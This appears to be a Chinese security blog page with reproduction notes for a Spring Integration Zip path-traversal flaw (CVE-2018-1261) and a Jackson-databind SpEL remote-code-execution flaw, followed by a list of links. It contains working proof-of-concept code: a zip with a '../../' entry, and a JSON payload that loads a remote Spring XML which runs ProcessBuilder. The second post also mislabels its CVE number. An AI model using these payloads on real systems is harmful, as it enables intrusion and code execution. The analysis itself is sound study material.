+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文参考了一些资料对CVE-2018-1261进行了复现与分析，内容包括了漏洞情况简介、漏洞复现、漏洞复现结果分析、总结反思以及参考链接。如有谬误还请指正！如有其他建议，请您多多指教！</p>
+<h2 id="0x01-漏洞情况简介"><a href="#0x01-漏洞情况简介" class="headerlink" title="0x01 漏洞情况简介"></a>0x01 漏洞情况简介</h2><p>漏洞名称：Spring Integration Zip不安全解压</p>
+<p>漏洞编号：CVE-2018-1261</p>
+<p>漏洞级别：严重（官方定级，比高危还高）[1]</p>
+<p>漏洞描述：在spring-integration-zip.v1.0.1.RELEASE之前的版本中，恶意用户通过在压缩文件中构造包含有特定文件名称的文件（受影响文件格式有bzip2, tar, xz, war, cpio, 7z），应用程序使用spring-integration-zip进行解压时，会导致跨目录任意写入文件漏洞的攻击。进而有可能被Getshell，远程控制。</p>
+<p>漏洞原理：攻击者可以通过构造一个包含名称带../前缀的文件的压缩包，在spring-integration-zip进行解压时文件跳出解压文件的目录限制，创建文件。</p>
+<p>漏洞利用前置条件：</p>
+<ol>
+<li><p>使用了spring-integration-zip库</p>
+</li>
+<li><p>接收并解压了来自不可信来源的压缩文件[2]</p>
+</li>
+</ol>
+<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>PoC的核心代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import org.springframework.core.io.DefaultResourceLoader;</span><br><span class="line">import org.springframework.core.io.Resource;</span><br><span class="line">import org.springframework.core.io.ResourceLoader;</span><br><span class="line">import org.springframework.integration.support.MessageBuilder;</span><br><span class="line">import org.springframework.integration.zip.transformer.UnZipTransformer;</span><br><span class="line">import org.springframework.messaging.Message;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    private static ResourceLoader resourceLoader = new DefaultResourceLoader();</span><br><span class="line">    private static File path =  new File(&quot;./CVE-2018-1261/&quot;);</span><br><span class="line">    public static void main(final String... args) &#123;</span><br><span class="line">        final Resource evilResource = resourceLoader.getResource(&quot;classpath:testzipdata/test1.zip&quot;);</span><br><span class="line">        try&#123;</span><br><span class="line">            InputStream evilIS = evilResource.getInputStream();</span><br><span class="line">            Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build();</span><br><span class="line">            UnZipTransformer unZipTransformer = new UnZipTransformer();</span><br><span class="line">            //设置解压文件的目录为CVE-2018-1261</span><br><span class="line">            unZipTransformer.setWorkDirectory(path);</span><br><span class="line">            unZipTransformer.afterPropertiesSet();</span><br><span class="line">            //漏洞入口点</span><br><span class="line">            unZipTransformer.transform(evilMessage);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>PoC所依赖的jar包由Maven进行配置[3]：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-integration-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.3.10.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-integration-file&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.3.10.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-integration-zip&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0.0.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.zeroturnaround&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;zt-zip&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.10&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>PoC所调用的“testzipdata/test1.zip”由这段Python脚本生成[4]：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    try:</span><br><span class="line">        binary = b&apos;ddddsss&apos;</span><br><span class="line">        zipFile = zipfile.ZipFile(&quot;test1.zip&quot;, &quot;a&quot;, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(&quot;test1.zip&quot;)</span><br><span class="line">        zipFile.writestr(&quot;../../dddwwtest.txt&quot;, binary)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    except IOError as e:</span><br><span class="line">        raise e</span><br></pre></td></tr></table></figure>
+<p>注：将“testzipdata/test1.zip”放在IDEA工程的“target\classes”目录下。</p>
+<p>PoC的运行结果如图所示。</p>
+<p><img src="CVE-2018-1261/PoC的运行结果.png" alt="PoC的运行结果"></p>
+<p>我们可以发现文件<code>../../dddwwtest.txt</code>没有被解压到文件夹<code>原定的解压路径</code>，而文件<code>dddwwtest.txt</code>被解压到了<code>工程的根目录</code>。漏洞复现成功。</p>
+<h2 id="0x03-漏洞复现结果分析"><a href="#0x03-漏洞复现结果分析" class="headerlink" title="0x03 漏洞复现结果分析"></a>0x03 漏洞复现结果分析</h2><p>为了进一步理解漏洞的原理，现在进行断点调试[5]。</p>
+<p>在漏洞的入口点设置断点，并<code>Step Into</code>这行代码，如图所示。</p>
+<p><img src="CVE-2018-1261/调试-漏洞入口点.png" alt="调试-漏洞入口点"></p>
+<p>接着<code>Step Into</code>这行代码，如图所示。</p>
+<p><img src="CVE-2018-1261/StepIntoAbstractTransformer.transform.png" alt="StepIntoAbstractTransformer.transform"></p>
+<p>接着<code>Step Into</code>这行代码，如图所示。</p>
+<p><img src="CVE-2018-1261/AbstractZipTransformer.doTransform.png" alt="AbstractZipTransformer.doTransform"></p>
+<p>此时，我们可以发现<code>UnZipTransformer.doZipTransform()</code>方法被用来处理压缩包，如图所示。</p>
+<p><img src="CVE-2018-1261/UnZipTransformer.doZipTransform.png" alt="UnZipTransformer.doZipTransform"></p>
+<p>通读<code>doZipTransform()</code>方法的代码可以发现，在遍历压缩包内目录及文件时，回调ZipEntryCallback中的process()方法对其进行处理，如图所示。</p>
+<p><img src="CVE-2018-1261/ZipEntryCallback-process.png" alt="ZipEntryCallback-process"></p>
+<p>通读<code>process()</code>方法的代码，并对这一行代码设置断点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final File destinationFile = new File(tempDir, zipEntryName);</span><br></pre></td></tr></table></figure>
+<p>接着并观察变量的具体值，我们可以发现这一行代码这里没任何过滤就进行文件路径和文件名的拼接，如图所示。</p>
+<p><img src="CVE-2018-1261/路径拼接.png" alt="路径拼接"></p>
+<p>为了更直观地观察变量的变化，还可以运用<code>Watches</code>监视器来监视这些表达式的变化：<code>workDirectory.getCanonicalPath()</code>、<code>destinationFile.getCanonicalPath()</code>与<code>destinationFile.getAbsolutePath()</code>，如图所示。</p>
+<p><img src="CVE-2018-1261/Watches.png" alt="Watches"></p>
+<p>我们可以发现在执行完第132行后，<code>destinationFile.getCanonicalPath()</code>随即变成了<code>D:\cve_workspace\XX\dddwwtest.txt</code>，而不是<code>destinationFile.getAbsolutePath()</code>的<code>D:\cve_workspace\XX\.\原定的解压路径\3a1ba461-fc75-f4b6-1aa1-26c3e9ad0d4d\..\..\dddwwtest.txt</code>。</p>
+<p><code>getAbsolutePath()</code>方法返回的是文件的绝地路径，而<code>getCanonicalPath()</code>方法也是返回文件的绝对路径，但会去除[..]这样的符号，即返回的是标准的绝地路径。因此可以推断：漏洞CVE-2018-1261的成因与<code>getCanonicalPath()</code>方法有关。</p>
+<p>在这里看一下官方的漏洞修复，<a href="https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b#diff-990b7a04b25d4c5b7cb46f536ac149b0" target="_blank" rel="noopener">官方的漏洞修复</a>增加了<code>checkpath()</code>个路径检测方法，如图所示：</p>
+<p><img src="CVE-2018-1261/checkpath.png" alt="checkpath"></p>
+<p>我们可以发现：官方的漏洞修复做了这个判断：如果字符串<code>destinationFile.getCanonicalPath()</code>的开头不与字符串<code>workDirectory.getCanonicalPath()</code>匹配，则抛出异常，不予解压。</p>
+<h2 id="0x04-总结反思"><a href="#0x04-总结反思" class="headerlink" title="0x04 总结反思"></a>0x04 总结反思</h2><ul>
+<li>Zip不安全解压漏洞有可能被用于getshell、或选择覆盖掉一些配置文件[6]，不应忽视；</li>
+<li>运用 Maven 管理Java PoC所依赖的Jar包，有助于提高搭建漏洞复现环境的效率；</li>
+<li>运用<code>Watches</code>等IntelliJ IDEA的调试工具，有助于提高Debug效率。</li>
+</ul>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[1] Gyyyy.Spring Integration Zip不安全解压（CVE-2018-1261）漏洞分析[EB/OL].[2018-5-19].<a href="https://mp.weixin.qq.com/s/SJPXdZWNKypvWmL-roIE0Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/SJPXdZWNKypvWmL-roIE0Q</a>.</p>
+<p>[2] 水清云影.【代码审计】Spring Integration Zip不安全解压(CVE-2018-1261)漏洞分析[EB/OL].[2018-5-19].<a href="http://www.cnblogs.com/sqyysec/p/9038892.html" target="_blank" rel="noopener">http://www.cnblogs.com/sqyysec/p/9038892.html</a>.</p>
+<p>[3] 等想出来再取.使用IntelliJ IDEA 配置Maven（入门）[EB/OL].[2016-5-20].<a href="https://blog.csdn.net/qq_32588349/article/details/51461182" target="_blank" rel="noopener">https://blog.csdn.net/qq_32588349/article/details/51461182</a>.</p>
+<p>[4] 羊小弟.Spring Integration Zip不安全解压（CVE-2018-1261）漏洞复现[EB/OL].[2018-5-19].<a href="https://www.cnblogs.com/yangxiaodi/p/9036916.html" target="_blank" rel="noopener">https://www.cnblogs.com/yangxiaodi/p/9036916.html</a>.</p>
+<p>[5] 重复的生活.调试中的step into step over step out[EB/OL].[2014-10-22].<a href="https://blog.csdn.net/yagamil/article/details/40372979" target="_blank" rel="noopener">https://blog.csdn.net/yagamil/article/details/40372979</a>.</p>
+<p>[6] k1n9.Java 文件解压的安全问题[EB/OL].[2017-12-9].<a href="http://k1n9.me/2017/12/09/java-sec-in-decompress/" target="_blank" rel="noopener">http://k1n9.me/2017/12/09/java-sec-in-decompress/</a>.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/03/17/CVE-2018-1261/" data-id="cjtcu8b4g0002o8v1gpnfkp6x" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CVE-2017-7275" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/chenergy1991.github.io/2019/03/17/CVE-2017-7275/" class="article-date">
+  <time datetime="2019-03-17T11:29:15.376Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/chenergy1991.github.io/2019/03/17/CVE-2017-7275/">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇学习笔记包含了<code>CVE-2017-7275</code>的漏洞原理概述、实验环境搭建、漏洞复现、漏洞分析等主要环节。如有谬误，请您帮我指正！如有其他建议，请您多多指教！</p>
+<h2 id="0x01-漏洞原理概述"><a href="#0x01-漏洞原理概述" class="headerlink" title="0x01 漏洞原理概述"></a>0x01 漏洞原理概述</h2><p><a href="https://mp.weixin.qq.com/s/FOOC9EmNqGE9YB5OAu4mEA" target="_blank" rel="noopener">《漏洞通告】Jackson-databind远程命令执行漏洞通告（CVE-2017-7525）》</a>[1]指出，<code>Jackson</code>是一个开源的java序列化与反序列化工具，可以将java对象序列化为<code>xml</code>和<code>json</code>格式的字符串或将两种文件<code>反序列化</code>为相应的对象。</p>
+<p>Jackson-databind存在<code>远程命令执行漏洞</code>，因Jackson反序列化漏洞（CVE-2017-7525）采用黑名单的方法修复程序，CVE-2017-17485在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用<code>Spring spel</code>来执行任意命令。</p>
+<h2 id="0x02-实验环境搭建"><a href="#0x02-实验环境搭建" class="headerlink" title="0x02 实验环境搭建"></a>0x02 实验环境搭建</h2><ul>
+<li>操作系统：Win 7 x64</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JDK 1.8.0_151</span><br><span class="line">apache-maven-3.3.3</span><br><span class="line">IntelliJ IDEA 2017.1.3</span><br></pre></td></tr></table></figure>
+<p>实验的测试环境是：<a href="https://github.com/irsl/jackson-rce-via-spel" target="_blank" rel="noopener">https://github.com/irsl/jackson-rce-via-spel</a></p>
+<p>为了搭建该测试环境，需要安装软件项目管理工具<code>Maven</code>，搭建过程可参考《<a href="http://www.aqniu.com/threat-alert/13382.html" target="_blank" rel="noopener">Spring框架的反序列化远程代码执行漏洞分析</a>》[2]；</p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><ul>
+<li>导入maven结构的web工程</li>
+</ul>
+<p>导入的过程可参考《<a href="https://jingyan.baidu.com/article/47a29f24460367c0142399ee.html" target="_blank" rel="noopener">IntelliJ IDEA如何导入maven结构的web工程</a>》[3]；导入后的结果如图所示：<br>CVE-2017-7275<br><img src="CVE-2017-7275/APP.java.png" alt="APP.java.png"></p>
+<ul>
+<li>将App.main()方法的“Program arguments”设置为“test-exploit.json”</li>
+</ul>
+<p>设置的过程如图所示：</p>
+<p><img src="CVE-2017-7275/test-exploit.json.png" alt="test-exploit.json.png"></p>
+<ul>
+<li>运行App.main()方法</li>
+</ul>
+<p>运行的结果如图所示：</p>
+<p><img src="CVE-2017-7275/calc.png" alt="calc.png"></p>
+<p>我们可以发现，计算器被弹出了。</p>
+<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>攻击的实施需要依靠<code>Jackson的反序列化</code>与<code>Spring表达式语言SpEL的引用Bean</code>。在这里做一个比喻（可能不是很恰当）。如果说这样的攻击方式是“披着羊皮的狼”的话，那么“Json文件名”充当了“羊皮”而被精心构造的“Json代码”与“SpEL”则充当了狼。而在“Java虚拟机中反序列化”相当于“引狼入室”。</p>
+<ul>
+<li>Jackson反序列化</li>
+</ul>
+<p>通过Jackson反序列化，可以将Json反序列化为Java对象。刚刚的漏洞复现工程就包含了Json反序列化的过程。</p>
+<p>例如，我们可以在刚刚的漏洞复现的工程中将App.main()方法的“Program arguments”设置为“test-legit.json”。test-legit.json的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:123&#125;</span><br></pre></td></tr></table></figure>
+<p>运行的结果则如图所示：</p>
+<p><img src="CVE-2017-7275/test-legalit.json.png" alt="test-legalit.json.png"></p>
+<p>我们可以发现，test-legit.json被反序列化成inner类的对象i，并且i的id属性值为“123”。</p>
+<ul>
+<li>Spring表达式语言SpEL的引用Bean</li>
+</ul>
+<p><code>SpEL</code>（Spring Expression Language）可用于引用Bean。<a href="[https://www.cnblogs.com/moonlightpoet/p/5541010.html">《Spring学习笔记–Spring表达式语言SpEL》</a>[4]这篇文章对“SpEL”讲解得不错。</p>
+<p>为了了解“SpEl”，我们可以在刚刚的漏洞复现工程里创建这样一个<code>Test.java</code>文件，其代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.qcct.myspring;</span><br><span class="line"></span><br><span class="line">import org.springframework.context.ApplicationContext;</span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line">import java.lang.ProcessBuilder;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by JJ on 2018/1/12.</span><br><span class="line"> */</span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;spel.xml&quot;);</span><br><span class="line">        ProcessBuilder pb = (ProcessBuilder) context.getBean(&quot;pb&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而Test.java调用的<code>spel.xml</code>的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans</span><br><span class="line">     http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">  &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">     &lt;constructor-arg value=&quot;mspaint.exe&quot; /&gt;</span><br><span class="line">     &lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码的执行结果如图所示：</p>
+<p><img src="CVE-2017-7275/mspaint.exe.png" alt="mspaint.exe.png"><br>我们可以发现“画图”被打开了。<code>ProcessBuilder</code>被SpEL引用了。</p>
+<ul>
+<li>分析test-exploit.json</li>
+</ul>
+<p><code>test-exploit.json</code>的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:123, &quot;obj&quot;: [&quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;, &quot;https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现，这个Json里有类名<code>org.springframework.context.support.FileSystemXmlApplicationContext</code>。于是我们可以从“External Libraries”查看这个类的源码。如图所示：</p>
+<p><img src="CVE-2017-7275/FileSystemXmlApplicationContext.png" alt="FileSystemXmlApplicationContext.png"></p>
+<p>我们还可以了解这个类的继承关系，如图所示：</p>
+<p><img src="CVE-2017-7275/DiagramForFileSystemXmlApplicationContext.png" alt="DiagramForFileSystemXmlApplicationContext.png"></p>
+<p>类的继承关系一目了然了。</p>
+<p>在博客[4]中，我发现了在引用Bean时，可以借助Spring框架的<code>ApplicationContext</code>接口中的<code>getBean</code>方法。其核心代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">	ApplicationContext context = new ClassPathXmlApplicationContext(&quot;spring-idol.xml&quot;);</span><br><span class="line">	Poet poet = (Poet) context.getBean(&quot;poet&quot;);</span><br><span class="line">	poet.recite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是我审查了<code>ApplicationContext</code>等接口的源码，后来在<code>BeanFactory</code>接口中发现了返回类型为<code>Object</code>的<code>getBean</code>方法，如图所示：</p>
+<p><img src="CVE-2017-7275/DiagramFor_getBean.png" alt="Diagram.png"></p>
+<p>我们也可以在<code>getBean</code>方法处设置断点，接着进行<code>Debug</code>，我们可以发现程序会停在断点处。这也说明了该<code>JAVA反序列化远程命令执行漏洞</code>与<code>getBean</code>方法息息相关。</p>
+<h2 id="0x05-反思"><a href="#0x05-反思" class="headerlink" title="0x05 反思"></a>0x05 反思</h2><ul>
+<li>Apachen Maven是不错的软件项目管理工具，可方便他人复现漏洞，值得继续学习；</li>
+<li>有时可以借助IntelliJ IDEA的<code>Show Diagram Popup</code>这个功能来观察类和接口的继承关系，以对所审计的代码有更直观的把握。</li>
+</ul>
+<h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p>[1]<a href="https://mp.weixin.qq.com/s/FOOC9EmNqGE9YB5OAu4mEA" target="_blank" rel="noopener">漏洞通告】Jackson-databind远程命令执行漏洞通告（CVE-2017-7525）</a></p>
+<p>[2]<a href="http://www.aqniu.com/threat-alert/13382.html" target="_blank" rel="noopener">Spring框架的反序列化远程代码执行漏洞分析</a></p>
+<p>[3]<a href="https://jingyan.baidu.com/article/47a29f24460367c0142399ee.html" target="_blank" rel="noopener">IntelliJ IDEA如何导入maven结构的web工程</a></p>
+<p>[4]<a href="[https://www.cnblogs.com/moonlightpoet/p/5541010.html">Spring学习笔记–Spring表达式语言SpEL</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/03/17/CVE-2017-7275/" data-id="cjtcu8b2p0000o8v1zr2trzrg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-好的链接" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/chenergy1991.github.io/2019/03/17/好的链接/" class="article-date">
+  <time datetime="2019-03-17T11:29:15.282Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/chenergy1991.github.io/2019/03/17/好的链接/">好的链接</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>整理，更新ing……</p>
+<ul>
+<li><p>###Java代码审计</p>
+<p>  #####Tips</p>
+<p>  <a href="http://blog.nsfocus.net/code-audit-instruction/" target="_blank" rel="noopener">【绿盟大讲堂】代码审计指南</a></p>
+<p>  <a href="https://github.com/Cryin/JavaID/blob/master/JAVA%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.md" target="_blank" rel="noopener">JAVA安全编码与代码审计</a></p>
+<p>  <a href="https://mp.weixin.qq.com/s/josQv1X6YjsttZr1O32j2Q" target="_blank" rel="noopener">JAVA代码审计的一些Tips 附脚本</a></p>
+<p>  <a href="http://mp.weixin.qq.com/s/52XQAj7D3kkPx3dXI2cuDA" target="_blank" rel="noopener">【链接】【精选】六款JavaWeb项目源码下载</a></p>
+<p>  聂心明翻译的<a href="http://find-sec-bugs.github.io/bugs.htm" target="_blank" rel="noopener">《http://find-sec-bugs.github.io/bugs.htm》</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/3358" target="_blank" rel="noopener">java代码审计手书(一）</a></p>
+</li>
+<li><a href="https://xz.aliyun.com/t/3372" target="_blank" rel="noopener">java代码审计手书(二）</a></li>
+<li><a href="https://xz.aliyun.com/t/3416" target="_blank" rel="noopener">java代码审计手书(三）</a></li>
+<li><p><a href="https://xz.aliyun.com/t/3460" target="_blank" rel="noopener">java代码审计手书(四）</a></p>
+<p>  #####实战分析文章</p>
+<p>  <a href="https://mp.weixin.qq.com/s/DaUnSkE-OCcutvcgF1jMwQ" target="_blank" rel="noopener">【JSP代码审计】某商城几处漏洞审计分析</a></p>
+<p>  <a href="https://mp.weixin.qq.com/s/vNL68jmZsIGOThbVcT5PkQ" target="_blank" rel="noopener">某租车系统JAVA代码审计</a></p>
+<p>  #####开源CMS收集</p>
+<p>  <a href="https://mp.weixin.qq.com/s/dTpt2N8ItRr7JxrQtmysng" target="_blank" rel="noopener">开源的Jave博客系统-Tale</a></p>
+<p>  <a href="https://www.oschina.net/project/lang/19/java" target="_blank" rel="noopener">OSChina 开源Java程序</a></p>
+<p>  <a href="https://www.zhihu.com/question/29836842" target="_blank" rel="noopener">国内有哪些质量高的JAVA社区？</a></p>
+<p>  <a href="https://www.ctolib.com/java/categories/java-security.html" target="_blank" rel="noopener">用于处理安全、认证、授权或会话管理的Java框架</a><br>  <a href="https://mp.weixin.qq.com/s/DayKyI88JYCH7pKWCitZ5w" target="_blank" rel="noopener">分享6个国内优秀Java后台管理框架的开源项目,建议收藏！</a></p>
+</li>
+<li><p>###Java反序列化漏洞研究</p>
+<p>  <a href="http://mp.weixin.qq.com/s/WLrbS198Vq_sOjWyc9Lz0w" target="_blank" rel="noopener">Java反序列化备忘录</a></p>
+</li>
+<li><p>###Java代码混淆化</p>
+<p>  <a href="https://www.owasp.org/index.php/Bytecode_obfuscation" target="_blank" rel="noopener">OWASP Bytecode obfuscation
+</a></p>
+<p>   <a href="https://www.quora.com/How-do-code-obfuscation-tools-work" target="_blank" rel="noopener">How do code obfuscation tools work?</a></p>
+<p>  <a href="https://java-source.net/open-source/obfuscators" target="_blank" rel="noopener">Open Source Obfuscators in Java</a></p>
+</li>
+</ul>
+<ul>
+<li><p>###漏洞研究方法论</p>
+<p>  <a href="http://blog.knownsec.com/Knownsec_RD_Checklist" target="_blank" rel="noopener">知道创宇研发技能表</a></p>
+<p>  <a href="https://www.owasp.org/images/b/b7/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.1.pdf" target="_blank" rel="noopener">OWASP Top 10 2017 10项最严重的 Web 应用程序安全风险</a></p>
+<p>  <a href="http://www.h3c.com/cn/d_201004/671496_30008_0.htm" target="_blank" rel="noopener">漏洞挖掘技术研究</a></p>
+</li>
+<li><p>###优秀的网络安全分析文章</p>
+<p>  <a href="http://mp.weixin.qq.com/s/WLrbS198Vq_sOjWyc9Lz0w" target="_blank" rel="noopener">Java反序列化备忘录</a></p>
+<p>  <a href="https://bbs.ichunqiu.com/home.php?mod=space&amp;uid=227946&amp;do=index" target="_blank" rel="noopener">黑客小平哥的空间</a></p>
+<p>  <a href="http://www.freebuf.com/column/1570ADIE/article/details/4533544313.html" target="_blank" rel="noopener">几种典型 JSP WebShell 的深度解析</a></p>
+<p>  <a href="https://xianzhi.aliyun.com/forum/" target="_blank" rel="noopener">先知社区</a></p>
+<p>  <a href="http://www.xianxianlabs.com/2018/06/03/webgoat1/" target="_blank" rel="noopener">Web安全攻防靶场之WebGoat – 1</a></p>
+<p>  <a href="https://www.0xss.cn/571.html" target="_blank" rel="noopener">WebGoat 8.0 M21失传几关的答案在这里
+</a></p>
+</li>
+<li><p>###杂项</p>
+<p>  <a href="http://url.cn/5W2s5ae" target="_blank" rel="noopener">【技术分享】常见的Web密码学攻击方式汇总</a></p>
+<p>  <a href="https://www.jianshu.com/p/49c8168c7418" target="_blank" rel="noopener">mac os下搭建hexo+github博客</a></p>
